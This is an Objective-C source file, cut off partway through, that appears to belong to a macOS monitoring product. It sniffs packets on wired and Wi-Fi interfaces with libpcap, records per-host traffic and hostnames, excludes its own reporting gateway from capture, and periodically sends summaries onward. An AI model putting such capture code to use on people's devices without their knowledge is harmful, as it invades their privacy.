//
//  NetworkTrafficCapture.m
//  NetworkTrafficCaptureManager
//
//  Created by ophat on 10/9/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//


#include <stdio.h>
#include <ifaddrs.h>
#include <arpa/inet.h>

#import <SystemConfiguration/SystemConfiguration.h>
#import <CoreWLAN/CoreWLAN.h>

#import "NTPacket.h"
#import "NetworkTrafficCapture.h"
#import "NetworkStructure.h"

#import "FxNetworkTrafficEvent.h"

#import "SystemUtilsImpl.h"
#import "DateTimeFormat.h"

#define kDirectionTypeDownload      0
#define kDirectionTypeUpload        1
#define kToSec                      60

void wifi_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx);
void lans_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx);

void receivePacketByLan(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) ;
void receivePacketByWifi(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

@implementation NetworkTrafficCapture
@synthesize mTotalDownloadByLan , mTotalUploadByLan;
@synthesize mTotalDownloadByWifi , mTotalUploadByWifi;
@synthesize mStartTime , mEndTime;
@synthesize mEn0IP , mEn1IP;
@synthesize mUsedInterfaceHandle1,mUsedInterfaceHandle2;
@synthesize mHandle1, mHandle2;
@synthesize mSchedule, mCounter;
@synthesize mShouldStop, mIsMerging, mIsTracking;
@synthesize mCFRunLoop1, mCFRunLoopSrc1;
@synthesize mCFRunLoop2, mCFRunLoopSrc2;
@synthesize mDelegate, mSelector , mThread;
@synthesize mMyUrl;

NetworkTrafficCapture * _NetworkTrafficCapture;

#pragma mark ### PrepareStartUp

-(void) prepareStartUp {
    if (!_NetworkTrafficCapture) {
        _NetworkTrafficCapture = self;
    }
    
    mTotalDownloadByLan  = [[NSMutableArray alloc]init];
    mTotalUploadByLan    = [[NSMutableArray alloc]init];
    mTotalDownloadByWifi = [[NSMutableArray alloc]init];
    mTotalUploadByWifi   = [[NSMutableArray alloc]init];
    
    [self getCurrentIPAddress];
}

#pragma mark ### start/stop
- (BOOL) startCaptureWithDuration:(int)aMin frequency:(int)aFre{
    if (!mIsTracking && mCounter == 0 ) {
        if ( aMin != 0 ) {
            self.mIsTracking = true;
            if ( aMin == -1 ) {
                self.mCounter = -1;
            }else{
                self.mCounter = aMin / aFre;
            }
            [self startCapture];
            
            self.mStartTime = [DateTimeFormat phoenixDateTime];
            
            self.mSchedule = [NSTimer scheduledTimerWithTimeInterval:(aFre * kToSec) target:self selector:@selector(triggerForSend) userInfo:nil repeats:YES];
            
            DLog(@"### startCaptureWithDuration For %d Mins Every %d Mins",aMin,aFre);
            return true;

        }else{
            DLog(@"### Can't Start with 0 Duration");
        }
    }else{
        DLog(@"### IsTracking");
    }
    return false;
}

-(void) startCapture{
    [self prepareStartUp];
    [self startNetworkCapture];
    [self startLanNetworkNotifierChange];
    [self startWifiNetworkNotifierChange];
}

-(void) stopCapture {
    [self stopNetworkCapture];
    [self stopLanNetworkNotifierChange];
    [self stopWifiNetworkNotifierChange];
}

#pragma mark ### start/stop NetworkCapture

-(void) startNetworkCapture {
    DLog(@"### startNetworkCapture");
    
    mShouldStop = false;
    mIsMerging = false;

    char *interface;
    char errbuf[PCAP_ERRBUF_SIZE];

    NSString * host = @"";
    if ([mMyUrl length] > 0) {
        host = [NSString stringWithFormat:@"host not %@",mMyUrl];
        host = [host stringByReplacingOccurrencesOfString:@"http://" withString:@""];
        host = [host stringByReplacingOccurrencesOfString:@"https://" withString:@""];
        host = [host stringByReplacingOccurrencesOfString:@"/gateway" withString:@""];
    }
   
    const char * filter_exp = [host UTF8String];
    
    bpf_u_int32 net;
    struct bpf_program filtter;
    
    pcap_if_t *alldevs;
    pcap_if_t *d;
    
    pcap_findalldevs(&alldevs, errbuf);
    
    if (alldevs == nil) {
        DLog(@"Couldn't find default device: %s\n", errbuf);
        return ;
    }
    
    for(d=alldevs; d; d=d->next){
        interface = d->name;
        NSString * checkInterface = [NSString stringWithFormat:@"%s",interface];
        if ([checkInterface isEqualToString:@"en0"]) {
        
            mHandle1 = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
            if (mHandle1 == NULL) {
                DLog(@"Couldn't open device %s: %s\n", interface, errbuf);
                return ;
            }
            if (pcap_compile(mHandle1, &filtter, filter_exp, 1, net) == -1) {
                DLog(@"Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(mHandle1));
                return ;
            }
            if (pcap_setfilter(mHandle1, &filtter) == -1) {
                DLog(@"Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(mHandle1));
                return ;
            }
            DLog(@"interface %s",interface);
            self.mUsedInterfaceHandle1 = [NSString stringWithFormat:@"%s",interface];
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                pcap_loop(mHandle1,-1,receivePacketByLan,nil);
            });
        }else if([checkInterface isEqualToString:@"en1"]){
            mHandle2 = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
            if (mHandle2 == NULL) {
                DLog(@"Couldn't open device %s: %s\n", interface, errbuf);
                return ;
            }
            if (pcap_compile(mHandle2, &filtter, filter_exp, 1, net) == -1) {
                DLog(@"Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(mHandle2));
                return ;
            }
            if (pcap_setfilter(mHandle2, &filtter) == -1) {
                DLog(@"Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(mHandle2));
                return ;
            }
            DLog(@"interface %s",interface);
            self.mUsedInterfaceHandle2 = [NSString stringWithFormat:@"%s",interface];
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                pcap_loop(mHandle2,-1,receivePacketByWifi,nil);
            });
    
        }
    }
}

-(void) stopNetworkCapture {
    DLog(@"stopNetworkCapture");
    if (mHandle1) {
        pcap_breakloop(mHandle1);
        pcap_close(mHandle1);
    }
    if (mHandle2) {
        pcap_breakloop(mHandle2);
        pcap_close(mHandle2);
    }
}

#pragma mark ### start /stop NetworkChangeAdapter

- (void) startLanNetworkNotifierChange {
    DLog(@"startLanNetworkNotifierChange ==> start");
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        NSMutableArray *scKeys = [[NSMutableArray alloc] init];
        [scKeys addObject:@"State:/Network/Interface/en0/IPv4"];
        
        SCDynamicStoreContext ctx = { 0, NULL, NULL, NULL, NULL };
        SCDynamicStoreRef store = SCDynamicStoreCreate(kCFAllocatorDefault,nil, lans_Network_ChangedCallback, &ctx);
        if (store == NULL) {
            return;
        }
        
        SCDynamicStoreSetNotificationKeys(store, (__bridge CFArrayRef)scKeys,  NULL);
        
        mCFRunLoop2 = CFRunLoopGetCurrent();
        mCFRunLoopSrc2 = SCDynamicStoreCreateRunLoopSource(NULL, store, 0);
        CFRunLoopAddSource(mCFRunLoop2, mCFRunLoopSrc2, kCFRunLoopDefaultMode);
        [[NSRunLoop currentRunLoop] run];
        
        CFRelease(store);
    });
}

- (void) stopLanNetworkNotifierChange{
    DLog(@"stopLanNetworkNotifierChange ==> stop");
    if (mCFRunLoop2 != nil && mCFRunLoopSrc2 != nil) {
        CFRunLoopRemoveSource(mCFRunLoop2, mCFRunLoopSrc2, kCFRunLoopDefaultMode);
        CFRunLoopStop(mCFRunLoop2);
        mCFRunLoopSrc2 = nil;
        mCFRunLoop2 = nil;
    }
}

- (void) startWifiNetworkNotifierChange {
    DLog(@"startWifiNetworkNotifierChange ==> start");
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        NSMutableArray *scKeys = [[NSMutableArray alloc] init];
        [scKeys addObject:@"State:/Network/Interface/en1/IPv4"];
        
        SCDynamicStoreContext ctx = { 0, NULL, NULL, NULL, NULL };
        SCDynamicStoreRef store = SCDynamicStoreCreate(kCFAllocatorDefault,nil, wifi_Network_ChangedCallback, &ctx);
        if (store == NULL) {
            return;
        }
        
        SCDynamicStoreSetNotificationKeys(store, (__bridge CFArrayRef)scKeys,  NULL);
        
        mCFRunLoop1 = CFRunLoopGetCurrent();
        mCFRunLoopSrc1 = SCDynamicStoreCreateRunLoopSource(NULL, store, 0);
        CFRunLoopAddSource( mCFRunLoop1 , mCFRunLoopSrc1, kCFRunLoopDefaultMode);
        [[NSRunLoop currentRunLoop] run];
        
        CFRelease(store);
    });
}

- (void) stopWifiNetworkNotifierChange {
    DLog(@"stopWifiNetworkNotifierChange ==> stop");
    if (mCFRunLoop1 != nil && mCFRunLoopSrc1 != nil) {
        CFRunLoopRemoveSource(mCFRunLoop1, mCFRunLoopSrc1, kCFRunLoopDefaultMode);
        CFRunLoopStop(mCFRunLoop1);
        mCFRunLoopSrc1 = nil;
        mCFRunLoop1 = nil;
    }
}

#pragma mark ### Lan / Wifi CallbackNotifier

void wifi_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx){
    [(__bridge NSArray *)changedKeys enumerateObjectsUsingBlock:^(NSString *key, NSUInteger idx, BOOL *stop) {
        NSString *adapterName = [key componentsSeparatedByString:@"/"][3];
        CWInterface *interface = [CWInterface interfaceWithName:adapterName];
        if ([[interface ssid] length]>0) {
            [_NetworkTrafficCapture updateIPBy:@"Wifi"];
        }
    }];
}

void lans_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx){
    [(__bridge NSArray *)changedKeys enumerateObjectsUsingBlock:^(NSString *key, NSUInteger idx, BOOL *stop) {
        NSString *adapterName = [key componentsSeparatedByString:@"/"][3];
        if ([adapterName length]>0) {
            [_NetworkTrafficCapture updateIPBy:@"Lan"];
        }
    }];
}

-(void) updateIPBy:(NSString *)aType{
    DLog(@"Update all IP By %@",aType);
    [self getCurrentIPAddress];
}

#pragma mark ### CapturePacket

void receivePacketByLan(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
 
    if (![_NetworkTrafficCapture mShouldStop]) {
        
        int trafficType = 0;
        
        const struct sniff_ip *ip;              /* The IP header */
        const struct sniff_tcp *tcp;            /* The TCP header */

        const struct sniff_ethernet *ethernet;  /* The ethernet header */
        const char *payload;                    /* Packet payload */

        ip_header *ih;
        udp_header *uh;
        u_int ip_len;
        u_short sport,dport;
      
        u_int size_ip;
        u_int size_tcp;
        

        ethernet = (struct sniff_ethernet*)(packet);
        
        ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
        size_ip = IP_HL(ip)*4;
        if (size_ip < 20) {
            //DLog(@" * Invalid IP header length: %u bytes\n", size_ip);
            return;
        }
        tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
        size_tcp = TH_OFF(tcp)*4;
        if (size_tcp < 20) {
            //DLog(@" * Invalid TCP header length: %u bytes\n", size_tcp);
            return;
        }
        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    
        trafficType = ip->ip_p;
        
        NSString * packet_length = [NSString stringWithFormat:@"%d",header->len];

        ih = (ip_header *) (packet + 14); //length of ethernet header
        
        /* retireve the position of the udp header */
        ip_len = (ih->ver_ihl & 0xf) * 4;
        uh = (udp_header *) ((u_char*)ih + ip_len);
        
        // GET PORT
        sport = ntohs( uh->sport );
        dport = ntohs( uh->dport );
        
        NSString * sourceIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4]];
        NSString * sourcePort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",sport]];
        
        NSString * destinationIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4]];
        NSString * destinationPort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",dport]];
       
        if ([_NetworkTrafficCapture.mEn0IP isEqualToString:sourceIP] || [_NetworkTrafficCapture.mEn1IP isEqualToString:sourceIP] ) {
             _NetworkTrafficCapture.mIsMerging = true;

            NTPacket * temp = [[NTPacket alloc] init];
            [temp setMTransportProtocol:trafficType];
            [temp setMDirection:kDirectionTypeUpload];
            [temp setMInterface:kNetworkTypeWired];
            [temp setMInterfaceName:_NetworkTrafficCapture.mUsedInterfaceHandle1];
            [temp setMPort:[destinationPort intValue]];
            [temp setMSource:sourceIP];
            [temp setMDestination:destinationIP];
            [temp setMSize:[packet_length integerValue]];
            
            if ([_NetworkTrafficCapture.mTotalUploadByLan count] == 0) {
                NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                }
                [temp setMPacketCount:1];
                [[_NetworkTrafficCapture mTotalUploadByLan] addObject:temp];
                [resolver release];
            }else{
                int indexSeq = -1;
                for (int i = 0; i < [_NetworkTrafficCapture.mTotalUploadByLan count]; i++) {
                    NTPacket * sub = [_NetworkTrafficCapture.mTotalUploadByLan objectAtIndex:i];
                    if ([NTPacket comparePacket:sub with:temp]) {
                        indexSeq = i;
                    }
                }
                if (indexSeq == -1) {
                    NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                    if ([resolver length]>0) {
                        [temp setMHostname:resolver];
                    }else{
                        [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                    }
                    [temp setMPacketCount:1];
                    [[_NetworkTrafficCapture mTotalUploadByLan] addObject:temp];
                    [resolver release];
                }else{
                    int sumSize = (int)[[_NetworkTrafficCapture.mTotalUploadByLan objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                    [[_NetworkTrafficCapture.mTotalUploadByLan objectAtIndex:indexSeq] setMSize:sumSize];
                    int sumPacket = (int)[[_NetworkTrafficCapture.mTotalUploadByLan objectAtIndex:indexSeq] mPacketCount] + 1;
                    [[_NetworkTrafficCapture.mTotalUploadByLan objectAtIndex:indexSeq] setMPacketCount:sumPacket];
                }
            }
           
            [temp release];
            
             _NetworkTrafficCapture.mIsMerging = false;
            
        }else if ([_NetworkTrafficCapture.mEn0IP isEqualToString:destinationIP] || [_NetworkTrafficCapture.mEn1IP isEqualToString:destinationIP] ) {
            _NetworkTrafficCapture.mIsMerging = true;

            NTPacket * temp = [[NTPacket alloc] init];
            [temp setMTransportProtocol:trafficType];
            [temp setMDirection:kDirectionTypeDownload];
            [temp setMInterface:kNetworkTypeWired];
            [temp setMInterfaceName:_NetworkTrafficCapture.mUsedInterfaceHandle1];
            [temp setMPort:[sourcePort intValue]];
            [temp setMSource:sourceIP];
            [temp setMDestination:destinationIP];
            [temp setMSize:[packet_length integerValue]];
            
            if ([_NetworkTrafficCapture.mTotalDownloadByLan count] == 0) {
                NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                }
                [temp setMPacketCount:1];
                [[_NetworkTrafficCapture mTotalDownloadByLan] addObject:temp];
                [resolver release];
            }else{
                int indexSeq = -1;
                for (int i = 0; i < [_NetworkTrafficCapture.mTotalDownloadByLan count]; i++) {
                    NTPacket * sub = [_NetworkTrafficCapture.mTotalDownloadByLan objectAtIndex:i];
                    if ([NTPacket comparePacket:sub with:temp]) {
                        indexSeq = i;
                    }
                }
                if (indexSeq == -1) {
                    NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                    if ([resolver length]>0) {
                        [temp setMHostname:resolver];
                    }else{
                        [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                    }
                    [temp setMPacketCount:1];
                    [[_NetworkTrafficCapture mTotalDownloadByLan] addObject:temp];
                    [resolver release];
                }else{
                    int sumSize = (int)[[_NetworkTrafficCapture.mTotalDownloadByLan objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                    [[_NetworkTrafficCapture.mTotalDownloadByLan objectAtIndex:indexSeq] setMSize:sumSize];
                    int sumPacket = (int)[[_NetworkTrafficCapture.mTotalDownloadByLan objectAtIndex:indexSeq] mPacketCount] + 1;
                    [[_NetworkTrafficCapture.mTotalDownloadByLan objectAtIndex:indexSeq] setMPacketCount:sumPacket];
                }
            }
            
            [temp release];
            
            _NetworkTrafficCapture.mIsMerging = false;
            
        }
        
        [sourceIP release];
        [sourcePort release];
        [destinationIP release];
        [destinationPort release];
    }
    
    [pool drain];
}

void receivePacketByWifi(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    if (![_NetworkTrafficCapture mShouldStop]) {
        
        int trafficType = 0;
        
        const struct sniff_ip *ip;              /* The IP header */
        const struct sniff_tcp *tcp;            /* The TCP header */

        const struct sniff_ethernet *ethernet;  /* The ethernet header */
        const char *payload;                    /* Packet payload */
        
        ip_header *ih;
        udp_header *uh;
        u_int ip_len;
        u_short sport,dport;
        
        u_int size_ip;
        u_int size_tcp;
        
        ethernet = (struct sniff_ethernet*)(packet);
        ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
        size_ip = IP_HL(ip)*4;
        if (size_ip < 20) {
            //DLog(@" * Invalid IP header length: %u bytes\n", size_ip);
            return;
        }
        tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
        size_tcp = TH_OFF(tcp)*4;
        if (size_tcp < 20) {
            //DLog(@" * Invalid TCP header length: %u bytes\n", size_tcp);
            return;
        }
        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
        
        trafficType = ip->ip_p;
  
        NSString * packet_length = [NSString stringWithFormat:@"%d",header->len];
        ih = (ip_header *) (packet + 14); // length of ethernet header

        /* retireve the position of the udp header */
        ip_len = (ih->ver_ihl & 0xf) * 4;
        uh = (udp_header *) ((u_char*)ih + ip_len);
        
        // GET PORT
        sport = ntohs( uh->sport );
        dport = ntohs( uh->dport );
        
        NSString * sourceIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4]];
        NSString * sourcePort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",sport]];
        
        NSString * destinationIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4]];
        NSString * destinationPort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",dport]];
        
        if ([_NetworkTrafficCapture.mEn0IP isEqualToString:sourceIP] || [_NetworkTrafficCapture.mEn1IP isEqualToString:sourceIP] ) {
             _NetworkTrafficCapture.mIsMerging = true;
            
            NTPacket * temp = [[NTPacket alloc] init];
            [temp setMTransportProtocol:trafficType];
            [temp setMDirection:kDirectionTypeUpload];
            [temp setMInterface:kNetworkTypeWifi];
            [temp setMInterfaceName:_NetworkTrafficCapture.mUsedInterfaceHandle2];
            [temp setMPort:[destinationPort intValue]];
            [temp setMSource:sourceIP];
            [temp setMDestination:destinationIP];
            [temp setMSize:[packet_length intValue]];
            
            if ([_NetworkTrafficCapture.mTotalUploadByWifi count] == 0) {
                NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                }
                [temp setMPacketCount:1];
                [[_NetworkTrafficCapture mTotalUploadByWifi] addObject:temp];
                [resolver release];
            }else{
                int indexSeq = -1;
                for (int i = 0; i < [_NetworkTrafficCapture.mTotalUploadByWifi count]; i++) {
                    NTPacket * sub = [_NetworkTrafficCapture.mTotalUploadByWifi objectAtIndex:i];
                    if ([NTPacket comparePacket:sub with:temp]) {
                        indexSeq = i;
                    }
                }
                if (indexSeq == -1) {
                    NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                    if ([resolver length]>0) {
                        [temp setMHostname:resolver];
                    }else{
                        [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                    }
                    [temp setMPacketCount:1];
                    [[_NetworkTrafficCapture mTotalUploadByWifi] addObject:temp];
                    [resolver release];
                }else{
                    int sumSize = (int)[[_NetworkTrafficCapture.mTotalUploadByWifi objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                    [[_NetworkTrafficCapture.mTotalUploadByWifi objectAtIndex:indexSeq] setMSize:sumSize];
                    int sumPacket = (int)[[_NetworkTrafficCapture.mTotalUploadByWifi objectAtIndex:indexSeq] mPacketCount] + 1;
                    [[_NetworkTrafficCapture.mTotalUploadByWifi objectAtIndex:indexSeq] setMPacketCount:sumPacket];
                }
            }
            
            [temp release];
            
             _NetworkTrafficCapture.mIsMerging = false;
            
        }else if ([_NetworkTrafficCapture.mEn0IP isEqualToString:destinationIP] || [_NetworkTrafficCapture.mEn1IP isEqualToString:destinationIP] ) {
            
             _NetworkTrafficCapture.mIsMerging = true;
            
            NTPacket * temp = [[NTPacket alloc] init];
            [temp setMTransportProtocol:trafficType];
            [temp setMDirection:kDirectionTypeDownload];
            [temp setMInterface:kNetworkTypeWifi];
            [temp setMInterfaceName:_NetworkTrafficCapture.mUsedInterfaceHandle2];
            [temp setMPort:[sourcePort intValue]];
            [temp setMSource:sourceIP];
            [temp setMDestination:destinationIP];
            [temp setMSize:[packet_length integerValue]];

            if ([_NetworkTrafficCapture.mTotalDownloadByWifi count] == 0) {
                NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                if ([resolver length]>0) {
                    [temp setMHostname:resolver];
                }else{
                    [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                }
                [temp setMPacketCount:1];
                [[_NetworkTrafficCapture mTotalDownloadByWifi] addObject:temp];
                [resolver release];
            }else{
                int indexSeq = -1;
                for (int i = 0; i < [_NetworkTrafficCapture.mTotalDownloadByWifi count]; i++) {
                    NTPacket * sub = [_NetworkTrafficCapture.mTotalDownloadByWifi objectAtIndex:i];
                    if ([NTPacket comparePacket:sub with:temp]) {
                        indexSeq = i;
                    }
                }
                if (indexSeq == -1) {
                    NSString * resolver = [[NSString alloc]initWithString:[_NetworkTrafficCapture getSource:[NSString stringWithFormat:@"%s",payload]]];
                    if ([resolver length]>0) {
                        [temp setMHostname:resolver];
                    }else{
                        [temp setMHostname:[_NetworkTrafficCapture getOnlyHostname:[_NetworkTrafficCapture runAsCommand:[NSString stringWithFormat:@"host %@",destinationIP]]]];
                    }
                    [temp setMPacketCount:1];
                    [[_NetworkTrafficCapture mTotalDownloadByWifi] addObject:temp];
                    [resolver release];
                }else{
                    int sumSize = (int)[[_NetworkTrafficCapture.mTotalDownloadByWifi objectAtIndex:indexSeq] mSize] + (int)[temp mSize];
                    [[_NetworkTrafficCapture.mTotalDownloadByWifi objectAtIndex:indexSeq] setMSize:sumSize];
                    int sumPacket = (int)[[_NetworkTrafficCapture.mTotalDownloadByWifi objectAtIndex:indexSeq] mPacketCount] + 1;
                    [[_NetworkTrafficCapture.mTotalDownloadByWifi objectAtIndex:indexSeq] setMPacketCount:sumPacket];
                }
            }
            
            [temp release];
            
             _NetworkTrafficCapture.mIsMerging = false;
            
        }

        [sourceIP release];
        [sourcePort release];
        [destinationIP release];
        [destinationPort release];
     
    }
    
    [pool drain];
}
#pragma mark ### readyToSend

-(void)triggerForSend {
    DLog(@"########### triggerForSend");
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        [self readyToSend];
    });
}

- (void) readyToSend {
    if ( mCounter != -1 ) {
         mCounter--;
    }
   
    DLog(@"########### mCounter %d",self.mCounter);
    
    mShouldStop = true;
    while (self.mIsMerging) {
        //DLog(@"Merging is in progress");
        sleep(0.1);
    }

    [self sendData];

    if (mCounter == 0 ) {
        
        [self.mSchedule invalidate];
        self.mSchedule = nil;
        
        [self stopCapture];
        
        [mTotalDownloadByLan release];
        [mTotalUploadByLan release];
        [mTotalDownloadByWifi release];
        [mTotalUploadByWifi release];
        
        mTotalDownloadByLan = nil;
        mTotalUploadByLan = nil;
        mTotalDownloadByWifi= nil;
        mTotalUploadByWifi = nil;
        
        mIsTracking = false;
        
    }else{
        self.mStartTime = [DateTimeFormat phoenixDateTime];
        
        [mTotalDownloadByLan removeAllObjects];
        [mTotalUploadByLan removeAllObjects];
        [mTotalDownloadByWifi removeAllObjects];
        [mTotalUploadByWifi removeAllObjects];
    }
    self.mEndTime   = @"";

    mShouldStop = false;
}

-(NSMutableArray *) mergeDownload:(NSMutableArray *)aDownload AndUpload:(NSMutableArray *)aUpload{
    
    NSMutableArray * fxNetworkInterface = [[NSMutableArray alloc]init];
    
    NSMutableArray * masterData = [[NSMutableArray alloc]init];
    [masterData addObjectsFromArray:aDownload];
    [masterData addObjectsFromArray:aUpload];
    
    NSMutableArray * countOwnIP = [[NSMutableArray alloc]init];
    NSMutableArray * interfaceType = [[NSMutableArray alloc]init];
    NSMutableArray * interfaceName = [[NSMutableArray alloc]init];
    
    for (int i=0; i < [masterData count]; i++) {
        NTPacket * temp = [masterData objectAtIndex:i];
        if ( [temp mDirection] == kDirectionTypeDownload ) {
            if (![countOwnIP containsObject:[temp mDestination]]) {
                [countOwnIP addObject:[temp mDestination]];
                [interfaceType addObject:[NSNumber numberWithInt:(int)[temp mInterface]]];
                [interfaceName addObject:[temp mInterfaceName]];
            }
        }else if ( [temp mDirection] == kDirectionTypeUpload ) {
            if (![countOwnIP containsObject:[temp mSource]]) {
                [countOwnIP addObject:[temp mSource]];
                [interfaceType addObject:[NSNumber numberWithInt:(int)[temp mInterface]]];
                [interfaceName addObject:[temp mInterfaceName]];
            }
        }
    }
    
    for (int i=0; i < [countOwnIP count]; i++) {
        
        FxNetworkInterface * networkInterface = [[FxNetworkInterface  alloc]init]; 
        [networkInterface setMNetworkType:(FxNetworkType)[[interfaceType objectAtIndex:i]intValue]];
        [networkInterface setMInterfaceName:[interfaceName objectAtIndex:i]];
        [networkInterface setMDescription:@""];
        [networkInterface setMIPv4:[countOwnIP objectAtIndex:i]];
        [networkInterface setMIPv6:@""];
        
        NSMutableArray * countIP = [[NSMutableArray alloc]init];
        NSMutableArray * countMyIP = [[NSMutableArray alloc]init];
        NSMutableArray * hostName = [[NSMutableArray alloc]init];
        
        for (int j=0; j < [masterData count]; j++) {
            NTPacket * temp = [masterData objectAtIndex:j];
            if ( [temp mDirection] == kDirectionTypeDownload ) {
                if (![countIP containsObject:[temp mSource]]) {
                    [countMyIP addObject:[temp mDestination]];
                    [countIP addObject:[temp mSource]];
                    [hostName addObject:[temp mHostname]];
                }
            }else if ( [temp mDirection] == kDirectionTypeUpload ) {
                if (![countIP containsObject:[temp mDestination]]) {
                    [countMyIP addObject:[temp mSource]];
                    [countIP addObject:[temp mDestination]];
                    [hostName addObject:[temp mHostname]];
                }
            }
        }
        
        NSMutableArray * fxRemoteHost = [[NSMutableArray alloc]init];
        
        for (int j=0; j < [countIP count]; j++) {
            if ([[countMyIP objectAtIndex:j]isEqualToString:[countOwnIP objectAtIndex:i]]) {
                
                FxRemoteHost * remoteHost = [[FxRemoteHost alloc]init];
                [remoteHost setMHostName:[hostName objectAtIndex:j]];
                [remoteHost setMIPv4:[countIP objectAtIndex:j]];
                [remoteHost setMIPv6:@""];
                
                NSMutableArray * fxTraffic = [[NSMutableArray alloc]init];
                
                NSMutableArray * transportType = [[NSMutableArray alloc]init];
                NSMutableArray * port = [[NSMutableArray alloc]init];
                NSMutableArray * dataIn = [[NSMutableArray alloc]init];
                NSMutableArray * dataOut = [[NSMutableArray alloc]init];
                NSMutableArray * packetIn = [[NSMutableArray alloc]init];
                NSMutableArray * packetOut = [[NSMutableArray alloc]init];

                for (int k=0; k < [masterData count]; k++) {
                    NTPacket * temp = [masterData objectAtIndex:k];
                    if ( [temp mDirection] == kDirectionTypeDownload ) {
                        if ([[temp mSource] isEqualToString:[countIP objectAtIndex:j]]) {
                            if ([port containsObject:[NSNumber numberWithInt:(int)[temp mPort]]]) {
                                int index =-1;
                                for (int l = 0; l < [port count]; l++) {
                                    if ((int)[[port objectAtIndex:l] integerValue] == (int)[temp mPort]) {
                                        index = l;
                                    }
                                }
                                if (index != -1) {
                                    [dataIn replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mSize]]];
                                    [packetIn replaceObjectAtIndex:index withObject:[NSNumber numberWithInt:(int)[temp mPacketCount]]];
                                 }
                            }else{
                                [transportType addObject:[NSNumber numberWithInt:(int)[temp mTransportProtocol]]];
                                [port addObject:[NSNumber numberWithInt:(int)[temp mPort]]];
